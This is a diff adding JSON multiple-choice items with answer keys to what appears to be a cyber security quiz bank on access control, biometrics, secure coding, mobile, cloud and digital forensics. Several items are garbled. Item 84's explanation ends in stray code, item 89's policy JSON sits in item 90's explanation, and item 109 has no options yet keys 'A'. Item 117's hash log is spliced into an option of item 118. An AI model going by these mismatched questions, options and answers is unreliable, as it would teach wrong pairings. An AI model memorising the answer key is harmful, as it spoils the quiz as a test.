+        "question": "(Comparison) What is the primary difference between RBAC and DAC?",
+        "options": [
+            {
+                "label": "A",
+                "text": "DAC is only for Windows; RBAC is for Linux."
+            },
+            {
+                "label": "B",
+                "text": "In DAC, the owner of an object sets permissions; in RBAC, the administrator defines permissions based on job functions."
+            },
+            {
+                "label": "C",
+                "text": "RBAC is less secure than DAC."
+            },
+            {
+                "label": "D",
+                "text": "DAC uses biometrics; RBAC uses passwords."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "DAC (Discretionary) gives users control over their own files. RBAC (Role-Based) centralizes\ncontrol, making it much easier for organizations to manage permissions as employees change\nroles.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 84,
+        "question": "(Conceptual) In biometric systems, what does the False Acceptance Rate (FAR) measure?",
+        "options": [
+            {
+                "label": "A",
+                "text": "The percentage of authorized users who are denied access."
+            },
+            {
+                "label": "B",
+                "text": "The percentage of unauthorized users who are incorrectly granted access."
+            },
+            {
+                "label": "C",
+                "text": "The time it takes to scan a fingerprint."
+            },
+            {
+                "label": "D",
+                "text": "The number of times the system crashes."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "FAR is a measure of security. A high FAR means the system is \"too loose\" and might let a\nstranger into the system. FRR (False Rejection Rate) is a measure of user convenience.\nreturn true;\n}\nreturn false;\n}",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 85,
+        "question": "(Scenario-Based) A company uses a single set of credentials to allow employees to log into their email, the HR portal, and the internal wiki without re-entering their password. This is known as:",
+        "options": [
+            {
+                "label": "A",
+                "text": "Multi-factor Authentication"
+            },
+            {
+                "label": "B",
+                "text": "Mandatory Access Control"
+            },
+            {
+                "label": "C",
+                "text": "Single Sign-On (SSO)"
+            },
+            {
+                "label": "D",
+                "text": "Identity Proofing"
+            }
+        ],
+        "correct_answer": "C",
+        "explanation": "SSO allows a user to authenticate once and gain access to multiple independent software\nsystems, improving productivity and reducing password fatigue.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 86,
+        "question": "(Calculation) A biometric vendor claims their system has a Crossover Error Rate (CER) of 0.01%. How should a security professional interpret this?",
+        "options": [
+            {
+                "label": "A",
+                "text": "The system is very slow."
+            },
+            {
+                "label": "B",
+                "text": "The system is highly accurate, as the CER represents the point where FAR and FRR are equal (the lower the CER, the better)."
+            },
+            {
+                "label": "C",
+                "text": "The system will fail every 100 scans."
+            },
+            {
+                "label": "D",
+                "text": "The system is insecure."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "CER is the primary metric for comparing biometric systems. A lower CER indicates a more\naccurate and better-tuned system.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 87,
+        "question": "(Conceptual) Which access control model is traditionally used in Military and Government settings because it relies on strict security labels and cannot be bypassed by users?",
+        "options": [
+            {
+                "label": "A",
+                "text": "RBAC"
+            },
+            {
+                "label": "B",
+                "text": "DAC"
+            },
+            {
+                "label": "C",
+                "text": "MAC (Mandatory Access Control)"
+            },
+            {
+                "label": "D",
+                "text": "Free-Form Access"
+            }
+        ],
+        "correct_answer": "C",
+        "explanation": "MAC is the most restrictive model. The system (operating system or database) enforces a\nsecurity policy defined by the administrator, and users cannot change the access rights to\ntheir own data.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 88,
+        "question": "(Scenario-Based) You want to prevent \"Privilege Creep\" (where users accumulate permissions over time that they no longer need). Which process is most effective?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Resetting all passwords monthly."
+            },
+            {
+                "label": "B",
+                "text": "Switching to biometrics."
+            },
+            {
+                "label": "C",
+                "text": "Regular User Access Reviews and Recertification."
+            },
+            {
+                "label": "D",
+                "text": "Installing an IDS."
+            }
+        ],
+        "correct_answer": "C",
+        "explanation": "Privilege creep is a major risk in RBAC. Regular audits ensure that if a user leaves a\ndepartment, their old permissions are stripped, upholding the Principle of Least Privilege.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 89,
+        "question": "(Code-Tracing) Analyze this JSON access policy. Which user is allowed to write to the database?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Alice"
+            },
+            {
+                "label": "B",
+                "text": "Bob"
+            },
+            {
+                "label": "C",
+                "text": "Both Alice and Bob"
+            },
+            {
+                "label": "D",
+                "text": "Neither"
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "In this RBAC-style policy, Bob is assigned the \"editor\" role. The \"editor\" role has the \"WRITE\"\npermission, whereas Alice's \"analyst\" role is limited to \"READ.\"",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 90,
+        "question": "(Conceptual) What is Federated Identity Management?",
+        "options": [
+            {
+                "label": "A",
+                "text": "A system where everyone uses the same password."
+            },
+            {
+                "label": "B",
+                "text": "A system that allows users to use the same credentials to access resources across different organizations or domains."
+            },
+            {
+                "label": "C",
+                "text": "A backup for the local active directory."
+            },
+            {
+                "label": "D",
+                "text": "A way to encrypt identities."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "policy.json\n{\n\"roles\": {\n\"analyst\": [\"READ\"],\n\"editor\": [\"READ\", \"WRITE\"]\n},\n\"users\": {\n\"alice\": \"analyst\",\n\"bob\": \"editor\"\n}\n}\nFederation (like using a Google or LinkedIn account to log into a third-party app) allows\nidentity information to be shared safely between trusted partners.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 91,
+        "question": "(Scenario-Based) An attacker uses a fraudulent website to intercept a user's 2FA SMS code in real-time and immediately uses it to log into the victim's real account. This demonstrates a weakness in which 2FA method?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Biometrics"
+            },
+            {
+                "label": "B",
+                "text": "Hardware Tokens"
+            },
+            {
+                "label": "C",
+                "text": "SMS-based OTP (due to interception/phishing)"
+            },
+            {
+                "label": "D",
+                "text": "Smart Cards"
+            }
+        ],
+        "correct_answer": "C",
+        "explanation": "SMS-based 2FA is considered the weakest form of MFA because it can be phished,\nintercepted via SIM swapping, or read by malware on the phone. Hardware tokens or app-\nbased push notifications are more secure.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 92,
+        "question": "(Conceptual) What is the primary objective of the \"Shift Left\" strategy in secure software development?",
+        "options": [
+            {
+                "label": "A",
+                "text": "To move all security tasks to the left side of the data center."
+            },
+            {
+                "label": "B",
+                "text": "To outsource security testing to third-party vendors."
+            },
+            {
+                "label": "C",
+                "text": "To integrate security activities (like threat modeling and code analysis) as early as possible in the SDLC."
+            },
+            {
+                "label": "D",
+                "text": "To use only open-source software."
+            }
+        ],
+        "correct_answer": "C",
+        "explanation": "\"Shift Left\" means moving security to the beginning of the \"timeline\" (which reads left-to-right).\nFixing a security flaw during the design phase is significantly cheaper than fixing it after the\nproduct has been deployed.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 93,
+        "question": "(Code-Tracing) Which of the following C code snippets demonstrates a Secure Coding practice for string copying? secure_copy.c // Option A strcpy(dest, src); // Option B strncpy(dest, src, sizeof(dest) - 1); dest[sizeof(dest) - 1] = '\\0';",
+        "options": [
+            {
+                "label": "A",
+                "text": "Option A"
+            },
+            {
+                "label": "B",
+                "text": "Option B"
+            },
+            {
+                "label": "C",
+                "text": "Both are equally secure."
+            },
+            {
+                "label": "D",
+                "text": "Neither is secure."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "strcpy is famously insecure because it does not check the size of the destination buffer,\nleading to buffer overflows. strncpy limits the number of characters copied, preventing\nmemory corruption.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 94,
+        "question": "(Comparison) What is a major limitation of SAST (Static Analysis) compared to DAST (Dynamic Analysis)?",
+        "options": [
+            {
+                "label": "A",
+                "text": "SAST requires the program to be running."
+            },
+            {
+                "label": "B",
+                "text": "SAST often produces a high number of \"False Positives\" (flagging code as dangerous when it is actually safe)."
+            },
+            {
+                "label": "C",
+                "text": "SAST cannot find logic errors."
+            },
+            {
+                "label": "D",
+                "text": "DAST is only for mobile apps."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "Since SAST tools analyze code without context, they often flag patterns that look like\nvulnerabilities but are actually handled safely elsewhere. DAST only flags vulnerabilities it can\nactually exploit in a running environment.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 95,
+        "question": "(Scenario-Based) During the Design Phase, a team creates a diagram showing how data moves through the system to identify where an attacker might intervene. This process is called:",
+        "options": [
+            {
+                "label": "A",
+                "text": "Fuzz Testing"
+            },
+            {
+                "label": "B",
+                "text": "Threat Modeling"
+            },
+            {
+                "label": "C",
+                "text": "Regression Testing"
+            },
+            {
+                "label": "D",
+                "text": "Penetration Testing"
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "Threat modeling (using frameworks like STRIDE) is a proactive design-time activity used to\nidentify potential security threats and define mitigation strategies before a single line of code is\nwritten.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 96,
+        "question": "(Conceptual) What is Fuzz Testing (Fuzzing)?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Testing the software in a room with high humidity."
+            },
+            {
+                "label": "B",
+                "text": "An automated testing technique that involves providing invalid, unexpected, or random data as inputs to a program to find crashes or memory leaks."
+            },
+            {
+                "label": "C",
+                "text": "Reviewing the code for comments."
+            },
+            {
+                "label": "D",
+                "text": "Testing the UI with a group of users."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "Fuzzing is excellent for finding deep-seated security vulnerabilities that human testers might\nmiss, such as unhandled edge cases in input parsers.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 97,
+        "question": "(Scenario-Based) A developer wants to ensure that a web form only accepts valid email addresses. They implement a Regular Expression check on the server. This is an example of:",
+        "options": [
+            {
+                "label": "A",
+                "text": "Output Encoding"
+            },
+            {
+                "label": "B",
+                "text": "Data Masking"
+            },
+            {
+                "label": "C",
+                "text": "Input Validation (Whitelisting)"
+            },
+            {
+                "label": "D",
+                "text": "Cryptographic Hashing"
+            }
+        ],
+        "correct_answer": "C",
+        "explanation": "Input validation ensures that data adheres to the expected format (Length, Type, Range)\nbefore it is processed. Whitelisting (allowing only valid formats) is much more secure than\nblacklisting (trying to catch bad inputs).",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 98,
+        "question": "(Conceptual) In the context of secure development, what is a Software Bill of Materials (SBOM)?",
+        "options": [
+            {
+                "label": "A",
+                "text": "A list of all hardware components in the server."
+            },
+            {
+                "label": "B",
+                "text": "A comprehensive list of all components, libraries, and dependencies used in a piece of software."
+            },
+            {
+                "label": "C",
+                "text": "The monthly bill for cloud hosting."
+            },
+            {
+                "label": "D",
+                "text": "A list of all developers' names."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "As modern software relies heavily on third-party libraries, an SBOM is essential for tracking\nwhich of your applications are affected when a new vulnerability (CVE) is discovered in a\ncommon library.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 99,
+        "question": "(Comparison) Why is Manual Code Review still necessary even if an organization uses automated SAST tools?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Automated tools are too fast."
+            },
+            {
+                "label": "B",
+                "text": "Automated tools struggle to find complex business logic flaws and architectural design errors that a human reviewer can spot."
+            },
+            {
+                "label": "C",
+                "text": "Manual review is required by the C++ compiler."
+            },
+            {
+                "label": "D",
+                "text": "Automated tools cannot read Java code."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "Automated tools are great at finding \"known bad patterns,\" but they lack the reasoning to\nunderstand why a certain piece of logic might be insecure in a specific business context.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 100,
+        "question": "(Conceptual) What is the primary functional improvement of WPA3 over WPA2 regarding password security?",
+        "options": [
+            {
+                "label": "A",
+                "text": "It uses a longer password minimum."
+            },
+            {
+                "label": "B",
+                "text": "It allows for 10Gbps speeds."
+            },
+            {
+                "label": "C",
+                "text": "It replaces the PSK 4-way handshake with SAE (Simultaneous Authentication of Equals), preventing offline dictionary attacks even if the user has a weak password."
+            },
+            {
+                "label": "D",
+                "text": "It automatically encrypts every website you visit."
+            }
+        ],
+        "correct_answer": "C",
+        "explanation": "In WPA2, an attacker can capture the \"handshake\" and use a powerful GPU to guess the\npassword offline. WPA3's SAE requires a live interaction with the AP for every guess, making\noffline brute-force mathematically impossible.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 101,
+        "question": "(Scenario-Based) An attacker sets up a Wi-Fi hotspot in a coffee shop with the same name as the legitimate one (e.g., \"Starbucks_Free\"). Users connect to it, and the attacker intercepts their unencrypted traffic. What is this attack called?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Bluejacking"
+            },
+            {
+                "label": "B",
+                "text": "Evil Twin"
+            },
+            {
+                "label": "C",
+                "text": "War Driving"
+            },
+            {
+                "label": "D",
+                "text": "Replay Attack"
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "An Evil Twin is a rogue Access Point that appears to be a legitimate one. It is a highly effective\nway to perform Man-in-the-Middle (MITM) attacks on unsuspecting mobile users.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 102,
+        "question": "(Conceptual) Why is Sandboxing considered a critical security feature in modern mobile operating systems (Android/iOS)?",
+        "options": [
+            {
+                "label": "A",
+                "text": "It makes the battery last longer."
+            },
+            {
+                "label": "B",
+                "text": "It ensures that each application runs in an isolated environment, preventing a malicious app from accessing the data or memory of another app."
+            },
+            {
+                "label": "C",
+                "text": "It allows apps to run faster."
+            },
+            {
+                "label": "D",
+                "text": "It prevents the user from downloading large files."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "On a desktop PC, apps often have broad access to the file system. On mobile, apps are\n\"caged.\" A game app cannot read your banking app's local data because they live in separate,\nrestricted sandboxes.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 103,
+        "question": "(Scenario-Based) A corporate employee Rooted their Android phone to install a custom theme. Why would the IT department block this device from the corporate network?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Rooted phones use too much bandwidth."
+            },
+            {
+                "label": "B",
+                "text": "Themes are a distraction to work."
+            },
+            {
+                "label": "C",
+                "text": "Rooting disables the built-in security protections and the OS kernel integrity, allowing malware to bypass the app sandbox and steal corporate data."
+            },
+            {
+                "label": "D",
+                "text": "Rooting a phone is illegal."
+            }
+        ],
+        "correct_answer": "C",
+        "explanation": "Rooting/Jailbreaking grants the user (and potentially malware) administrative control over the\nkernel. This destroys the \"Root of Trust\" that mobile security relies on to keep apps isolated.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 104,
+        "question": "(Conceptual) In the context of Mobile Device Management (MDM), what is a \"Remote Wipe\"?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Deleting the search history on the phone."
+            },
+            {
+                "label": "B",
+                "text": "A command sent over the network to a lost or stolen device that securely deletes all user data to prevent unauthorized access."
+            },
+            {
+                "label": "C",
+                "text": "Cleaning the physical screen of the device."
+            },
+            {
+                "label": "D",
+                "text": "Disconnecting the phone from the Wi-Fi."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "Remote wipe is a core security feature for enterprises. If a laptop or phone containing\nsensitive emails is lost, the admin can send a \"poison pill\" that resets the device to factory\nsettings as soon as it connects to the internet.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 105,
+        "question": "(Code/Logic) A security researcher discovers a vulnerability in the 4-way handshake of a Wi-Fi protocol. This is most likely referring to which historical exploit?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Heartbleed"
+            },
+            {
+                "label": "B",
+                "text": "KRACK (Key Reinstallation Attack)"
+            },
+            {
+                "label": "C",
+                "text": "SQL Injection"
+            },
+            {
+                "label": "D",
+                "text": "Log4j"
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "The KRACK attack (2017) targets WPA2. It tricks the victim into reinstalling an already-in-use\nkey, which allows the attacker to decrypt or forge Wi-Fi traffic.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 106,
+        "question": "(Comparison) What is the difference between Bluejacking and Bluesnarfing?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Bluesnarfing is for Wi-Fi; Bluejacking is for Bluetooth."
+            },
+            {
+                "label": "B",
+                "text": "Bluejacking is sending unwanted messages; Bluesnarfing is the unauthorized theft of information (contacts, photos) from a device."
+            },
+            {
+                "label": "C",
+                "text": "Bluejacking is more dangerous than Bluesnarfing."
+            },
+            {
+                "label": "D",
+                "text": "There is no difference."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "Bluejacking is essentially \"Bluetooth Spam.\" Bluesnarfing is a severe privacy breach where an\nattacker gains access to the data stored on a Bluetooth-enabled device.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 107,
+        "question": "(Conceptual) Which principle is violated when a simple \"Calculator\" app requests access to your GPS location, Contacts, and Microphone?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Defense in Depth"
+            },
+            {
+                "label": "B",
+                "text": "Data Integrity"
+            },
+            {
+                "label": "C",
+                "text": "Principle of Least Privilege"
+            },
+            {
+                "label": "D",
+                "text": "Non-repudiation"
+            }
+        ],
+        "correct_answer": "C",
+        "explanation": "Least Privilege states that an entity should only have access to the resources it needs to\nfunction. A calculator has no functional requirement for location or contact data; such requests\nare a major privacy red flag.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 108,
+        "question": "(Conceptual) According to the Shared Responsibility Model for an Infrastructure-as- a-Service (IaaS) provider, who is responsible for patching the Guest Operating System (e.g., Windows/Linux) running on a virtual machine?",
+        "options": [
+            {
+                "label": "A",
+                "text": "The Cloud Provider (e.g., AWS/Google)."
+            },
+            {
+                "label": "B",
+                "text": "The Customer."
+            },
+            {
+                "label": "C",
+                "text": "The Hardware Manufacturer."
+            },
+            {
+                "label": "D",
+                "text": "It is patched automatically by the hypervisor."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "In IaaS, the provider only secures the physical host and hypervisor. The customer \"owns\" the\nvirtual machine and is responsible for all software updates, security patches, and firewalls\ninside that VM.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 109,
+        "question": "(Scenario-Based) An attacker exploits a vulnerability in a web application running on a Virtual Machine and is able to execute commands directly on the Host physical server, bypassing the VM boundaries. What is this attack called? Hypervisor Escape is a severe security failure. It allows an attacker to break the isolation of virtualization, potentially gaining access to all other VMs running on the same physical server.",
+        "options": [],
+        "correct_answer": "A",
+        "explanation": "",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 110,
+        "question": "(Conceptual) What is the primary security benefit of using a VPC (Virtual Private Cloud)?",
+        "options": [
+            {
+                "label": "A",
+                "text": "It makes the website faster."
+            },
+            {
+                "label": "B",
+                "text": "It provides an isolated, private virtual network environment where the customer has full control over IP addresses, subnets, and routing."
+            },
+            {
+                "label": "C",
+                "text": "It automatically encrypts all files."
+            },
+            {
+                "label": "D",
+                "text": "It replaces the need for passwords."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "A VPC allows a company to create their own \"private datacenter\" in the cloud, ensuring their\nservers are not directly exposed to the public internet unless explicitly configured.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 111,
+        "question": "(Scenario-Based) A developer accidentally commits an AWS Access Key to a public GitHub repository. Within minutes, attackers use the key to spin up 100 expensive servers for crypto-mining. This is a failure in:",
+        "options": [
+            {
+                "label": "A",
+                "text": "Physical Security"
+            },
+            {
+                "label": "B",
+                "text": "Hypervisor Isolation"
+            },
+            {
+                "label": "C",
+                "text": "Identity and Access Management (IAM) / Secret Management"
+            },
+            {
+                "label": "D",
+                "text": "Data Integrity"
+            }
+        ],
+        "correct_answer": "C",
+        "explanation": "Secrets management is a core pillar of cloud security. Hardcoding keys is a critical mistake.\nProfessionals use \"Roles\" and \"Secret Managers\" to provide temporary, rotated credentials.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 112,
+        "question": "(Comparison) Compare **Software-as-a-Service (SaaS)** and **Infrastructure-as-a- Service (IaaS)** security. In which model does the Customer have the least amount of security responsibility?",
+        "options": [
+            {
+                "label": "A",
+                "text": "IaaS"
+            },
+            {
+                "label": "B",
+                "text": "PaaS"
+            },
+            {
+                "label": "C",
+                "text": "SaaS"
+            },
+            {
+                "label": "D",
+                "text": "They are the same."
+            }
+        ],
+        "correct_answer": "C",
+        "explanation": "In SaaS (like Gmail or Salesforce), the provider manages almost everything, including the\napplication code and OS. The customer is only responsible for their own account settings and\nthe data they enter.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 113,
+        "question": "(Conceptual) What is Cloud Sprawl and why is it a security risk?",
+        "options": [
+            {
+                "label": "A",
+                "text": "It is a type of cloud-based malware."
+            },
+            {
+                "label": "B",
+                "text": "The uncontrolled proliferation of cloud instances and services, often leading to unmonitored and unpatched resources (\"shadow IT\")."
+            },
+            {
+                "label": "C",
+                "text": "When a cloud provider goes out of business."
+            },
+            {
+                "label": "D",
+                "text": "When data centers are too far apart."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "\"You can't secure what you don't know you have.\" Cloud sprawl leads to \"orphaned\" servers\nthat may have weak passwords or old vulnerabilities, serving as an easy entry point for\nattackers.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 114,
+        "question": "(Conceptual) In a cloud environment, what is the role of a Security Group?",
+        "options": [
+            {
+                "label": "A",
+                "text": "A team of human security guards."
+            },
+            {
+                "label": "B",
+                "text": "A virtual firewall that controls inbound and outbound traffic for one or more instances (at the interface level)."
+            },
+            {
+                "label": "C",
+                "text": "A tool for encrypting hard drives."
+            },
+            {
+                "label": "D",
+                "text": "A backup service for the database."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "Security groups provide the primary layer of network security in the cloud, allowing you to\nexplicitly \"allow\" only specific traffic (e.g., allow Port 443 from anywhere).",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 115,
+        "question": "(Scenario-Based) A company needs to ensure that their data in an S3 bucket is encrypted even if an attacker manages to steal the physical hard drive from the cloud provider's data center. Which technology solves this?",
+        "options": [
+            {
+                "label": "A",
+                "text": "TLS/SSL"
+            },
+            {
+                "label": "B",
+                "text": "Encryption at Rest (e.g., AES-256 with KMS)"
+            },
+            {
+                "label": "C",
+                "text": "Multi-factor Authentication"
+            },
+            {
+                "label": "D",
+                "text": "A Virtual Private Network (VPN)"
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "Encryption at rest protects the stored data. Cloud providers offer \"Server-Side Encryption,\"\nwhich ensures that the data is encrypted before it is written to the physical disk.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 116,
+        "question": "(Scenario-Based) An investigator arrives at a crime scene where a laptop is powered on and logged in. According to the Order of Volatility, which data should be captured first?",
+        "options": [
+            {
+                "label": "A",
+                "text": "The contents of the hard drive."
+            },
+            {
+                "label": "B",
+                "text": "External USB backup drives."
+            },
+            {
+                "label": "C",
+                "text": "System RAM (memory) and active network connections."
+            },
+            {
+                "label": "D",
+                "text": "The history stored in the web browser."
+            }
+        ],
+        "correct_answer": "C",
+        "explanation": "RAM is the most volatile. If the computer is turned off or the battery dies, all data in RAM is\nlost forever. This may include encryption keys for the hard drive that make disk forensics\nimpossible later.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 117,
+        "question": "(Code-Tracing) A forensic tool generates the following output after imaging a drive. What is the investigator checking here?",
+        "options": [
+            {
+                "label": "A",
+                "text": "The speed of the data transfer."
+            },
+            {
+                "label": "B",
+                "text": "Data Integrity; ensuring the forensic copy is an exact, unaltered replica of the original evidence."
+            },
+            {
+                "label": "C",
+                "text": "The capacity of the destination drive."
+            },
+            {
+                "label": "D",
+                "text": "The decryption status of the files."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "Hashing (SHA-256) is used to prove that not a single bit of data changed during the imaging\nprocess. A verified match is required for the evidence to be admissible in court.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 118,
+        "question": "(Conceptual) What is the specific purpose of a Hardware Write Blocker during the evidence acquisition phase?",
+        "options": [
+            {
+                "label": "A",
+                "text": "To speed up the imaging process."
+            },
+            {
+                "label": "B",
+                "text": "To encrypt the original drive."
+            },
+            {
+                "label": "C",
+                "text": "To physically prevent the OS from writing even a single byte of metadata back to forensic-verify.log [Source Drive] SHA-256: 8f43...a12e [Forensic Image] SHA-256: 8f43...a12e [Status]: VERIFIED MATCH the evidence drive."
+            },
+            {
+                "label": "D",
+                "text": "To find deleted files automatically."
+            }
+        ],
+        "correct_answer": "C",
+        "explanation": "Modern Operating Systems automatically write hidden metadata (like \"Last Accessed Time\")\nto a drive as soon as it is plugged in. A write blocker intercepts these commands, ensuring the\noriginal evidence remains 100% untouched.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 119,
+        "question": "(Scenario-Based) A digital investigator completes an analysis but forgets to document who had access to the evidence locker for a 24-hour period. Which legal requirement has been compromised?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Right to Privacy"
+            },
+            {
+                "label": "B",
+                "text": "Chain of Custody"
+            },
+            {
+                "label": "C",
+                "text": "Rules of Engagement"
+            },
+            {
+                "label": "D",
+                "text": "Search and Seizure"
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "Chain of Custody must be unbroken. Any \"gap\" in the documentation of who handled the\nevidence creates a window for potential tampering, making the evidence inadmissible.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 120,
+        "question": "(Comparison) How does a Bit-stream Image differ from a standard Back-up of a folder?",
+        "options": [
+            {
+                "label": "A",
+                "text": "Bit-stream images are smaller."
+            },
+            {
+                "label": "B",
+                "text": "Bit-stream images include unallocated space, slack space, and deleted file fragments; Back-ups only include active files."
+            },
+            {
+                "label": "C",
+                "text": "Back-ups are used in courts, images are not."
+            },
+            {
+                "label": "D",
+                "text": "There is no technical difference."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "A Bit-stream image is a physical-level copy of every sector on the disk. This allows\ninvestigators to find \"deleted\" data that hasn't been overwritten yet, which a file-level backup\nwould ignore.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 121,
+        "question": "(Conceptual) In digital forensics, where are deleted files typically found before they are overwritten by new data?",
+        "options": [
+            {
+                "label": "A",
+                "text": "In the CPU cache."
+            },
+            {
+                "label": "B",
+                "text": "In the Unallocated Space (Free Space) of the file system."
+            },
+            {
+                "label": "C",
+                "text": "In the BIOS/UEFI firmware."
+            },
+            {
+                "label": "D",
+                "text": "In the RAM."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "When you delete a file, the OS simply marks that area of the disk as \"Available\" (Unallocated)\nin the file table. The actual 1s and 0s remain on the disk until a new file is written over that\nspecific sector.",
+        "subject": "Cyber Security",
+        "difficulty": "medium",
+        "marks": 1,
+        "type": "mcq"
+    },
+    {
+        "id": 122,
+        "question": "(Conceptual) What is Steganography?",
+        "options": [
+            {
+                "label": "A",
+                "text": "The process of cracking a password."
+            },
+            {
+                "label": "B",
+                "text": "The art of hiding a secret message or file inside another non-secret file (like an image or audio file)."
+            },
+            {
+                "label": "C",
+                "text": "A method of DDoS protection."
+            },
+            {
+                "label": "D",
+                "text": "Encrypting the entire hard drive."
+            }
+        ],
+        "correct_answer": "B",
+        "explanation": "Steganography differs from encryption because it hides the existence of the message. An\ninvestigator might see a normal looking JPEG of a sunset that actually contains a hidden text\nfile.",
+        "subject": "Cyber Security",
